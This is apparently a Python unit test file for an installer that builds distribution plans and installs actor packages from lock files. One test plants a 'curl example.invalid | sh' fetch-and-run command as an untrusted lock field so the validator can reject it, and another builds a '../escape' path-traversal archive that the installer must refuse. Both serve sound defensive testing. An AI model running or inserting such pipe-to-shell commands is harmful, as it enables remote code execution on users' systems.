from __future__ import annotations

import hashlib
import io
import json
import os
import subprocess
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
DISTRO = ROOT / "distro"
sys.path.insert(0, str(DISTRO))

import starintel_install as installer  # noqa: E402


class InstallerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.previous_share = os.environ.get("STARINTEL_DISTRO_SHARE")
        os.environ["STARINTEL_DISTRO_SHARE"] = str(DISTRO)

    def tearDown(self) -> None:
        if self.previous_share is None:
            os.environ.pop("STARINTEL_DISTRO_SHARE", None)
        else:
            os.environ["STARINTEL_DISTRO_SHARE"] = self.previous_share

    @staticmethod
    def package(**overrides: object) -> dict[str, object]:
        value: dict[str, object] = {
            "name": "example-actors",
            "version": "1.2.3",
            "actorSystem": "sento",
            "entrypoint": "example-actors:start",
            "starintel": {"releaseVersion": "0.10.1", "schemaVersion": "0.10.1"},
            "github": {
                "repository": "lost-rob0t/example-actors",
                "tag": "v1.2.3",
                "asset": "example-actors-1.2.3.tar.gz",
                "sha256": "0" * 64,
            },
        }
        value.update(overrides)
        return value

    def test_edge_plan_uses_tek9_zmq_and_no_rabbitmq(self) -> None:
        plan = installer.build_plan(
            "edge", [], [], installer.load_profiles(), installer.load_spec_lock()
        )
        self.assertEqual(plan["transport"], "zeromq")
        self.assertEqual(plan["storage"], "tek9-lmdb")
        self.assertIn("tek9", plan["components"])
        self.assertNotIn("rabbitmq", plan["components"])
        self.assertEqual(plan["starintel"]["releaseVersion"], "0.10.1")
        self.assertEqual(plan["distribution"], "attax-os")
        self.assertEqual(plan["defaultShell"], "lish")
        self.assertIn("hackmode.invoke", plan["systemApis"])

    def test_debian_and_termux_plans_share_the_common_lisp_api(self) -> None:
        for platform in ("debian", "termux"):
            with self.subTest(platform=platform):
                plan = installer.build_plan(
                    "edge",
                    [],
                    [],
                    installer.load_profiles(),
                    installer.load_spec_lock(),
                    platform,
                )
                self.assertEqual(plan["platform"], platform)
                self.assertIn("starintel-common-lisp-system-api", plan["components"])
                self.assertIn("geo.position.read", plan["systemApis"])

    def test_actors_profile_requires_a_lock(self) -> None:
        with self.assertRaisesRegex(installer.InstallerError, "requires --actor-lock"):
            installer.build_plan(
                "actors", [], [], installer.load_profiles(), installer.load_spec_lock()
            )

    def test_actor_packages_become_service_declarations(self) -> None:
        package = self.package()
        plan = installer.build_plan(
            "actors",
            [],
            [package],
            installer.load_profiles(),
            installer.load_spec_lock(),
            "debian",
        )
        self.assertEqual(
            plan["actorServices"],
            [
                {
                    "name": "example-actors",
                    "actorSystem": "sento",
                    "entrypoint": "example-actors:start",
                }
            ],
        )

    def test_full_profile_accepts_only_known_heavy_options(self) -> None:
        plan = installer.build_plan(
            "full",
            ["search", "observability"],
            [],
            installer.load_profiles(),
            installer.load_spec_lock(),
        )
        self.assertEqual(plan["heavy"], ["observability", "search"])
        with self.assertRaisesRegex(installer.InstallerError, "unknown heavy"):
            installer.build_plan(
                "full", ["mystery"], [], installer.load_profiles(), installer.load_spec_lock()
            )

    def test_lock_rejects_wrong_starintel_release(self) -> None:
        package = self.package(
            starintel={"releaseVersion": "0.9.1", "schemaVersion": "0.9.0"}
        )
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "actors.lock.json"
            path.write_text(
                json.dumps({"format": installer.ACTOR_LOCK_FORMAT, "packages": [package]}),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(installer.InstallerError, "expected 0.10.1/0.10.1"):
                installer.load_actor_lock(path, installer.load_spec_lock())

    def test_lock_rejects_unknown_fields(self) -> None:
        package = self.package(untrustedCommand="curl example.invalid | sh")
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "actors.lock.json"
            path.write_text(
                json.dumps({"format": installer.ACTOR_LOCK_FORMAT, "packages": [package]}),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(installer.InstallerError, "contain exactly"):
                installer.load_actor_lock(path, installer.load_spec_lock())

    def test_actor_archive_install_is_digest_independent_and_idempotent(self) -> None:
        package = self.package()
        manifest = {
            key: package[key]
            for key in ("name", "version", "actorSystem", "entrypoint", "starintel")
        }
        manifest["format"] = installer.ACTOR_PACKAGE_FORMAT
        with tempfile.TemporaryDirectory() as temporary:
            temporary_path = Path(temporary)
            archive_path = temporary_path / "actor.tar.gz"
            content = json.dumps(manifest).encode()
            with tarfile.open(archive_path, "w:gz") as archive:
                info = tarfile.TarInfo("actor-package.json")
                info.size = len(content)
                archive.addfile(info, io.BytesIO(content))
                payload = b"actor payload"
                info = tarfile.TarInfo("actors/example.lisp")
                info.size = len(payload)
                archive.addfile(info, io.BytesIO(payload))
            package["github"]["sha256"] = hashlib.sha256(archive_path.read_bytes()).hexdigest()
            actor_root = temporary_path / "actors"
            first = installer.install_actor_archive(archive_path, actor_root, package)
            current = actor_root / "example-actors" / "current"
            current.unlink()
            current.symlink_to("unrelated-version")
            second = installer.install_actor_archive(archive_path, actor_root, package)
            self.assertEqual(first, second)
            self.assertTrue((first / "actors" / "example.lisp").is_file())
            self.assertEqual(current.resolve(), first)

    def test_actor_archive_rejects_traversal(self) -> None:
        package = self.package()
        with tempfile.TemporaryDirectory() as temporary:
            temporary_path = Path(temporary)
            archive_path = temporary_path / "bad.tar.gz"
            with tarfile.open(archive_path, "w:gz") as archive:
                payload = b"bad"
                info = tarfile.TarInfo("../escape")
                info.size = len(payload)
                archive.addfile(info, io.BytesIO(payload))
            with self.assertRaisesRegex(installer.InstallerError, "unsafe actor package path"):
                installer.install_actor_archive(archive_path, temporary_path / "actors", package)

    def test_headless_cli_writes_plan_under_selected_root(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            result = subprocess.run(
                [
                    sys.executable,
                    str(DISTRO / "starintel_install.py"),
                    "install",
                    "--profile",
                    "edge",
                    "--root",
                    temporary,
                    "--non-interactive",
                    "--yes",
                ],
                check=False,
                text=True,
                capture_output=True,
                env={**os.environ, "STARINTEL_DISTRO_SHARE": str(DISTRO)},
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            plan_path = Path(temporary) / "etc" / "starintel" / "distro.json"
            plan = json.loads(plan_path.read_text(encoding="utf-8"))
            self.assertEqual(plan["profile"], "edge")


if __name__ == "__main__":
    unittest.main()
